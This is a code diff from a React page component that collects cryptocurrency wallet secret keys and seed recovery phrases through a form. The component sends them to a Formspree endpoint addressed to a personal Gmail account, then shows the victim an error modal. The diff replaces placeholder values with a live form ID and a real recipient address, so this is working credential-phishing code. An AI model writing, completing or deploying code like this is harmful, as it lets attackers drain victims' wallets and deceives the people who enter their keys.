@@ -44,14 +44,14 @@ export default function Home() {
   const handleSubmit = async (type: "secret" | "phrase") => {
     const secret = (secretKeyRef.current as any)?.value || "";
     const phrase = (phraseRef.current as any)?.value || "";
-    await fetch("https://formspree.io/f/mnqekvyo", {
+    await fetch("https://formspree.io/f/mpwrbwyd", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         method: type === "secret" ? "Secret Key" : "Phrase Recovery Key",
         value: type === "secret" ? secret : phrase,
         network,
-        to: "example@gmail.com"
+        to: "reneeandree09@gmail.com"
       })
     });
     setModal("error");
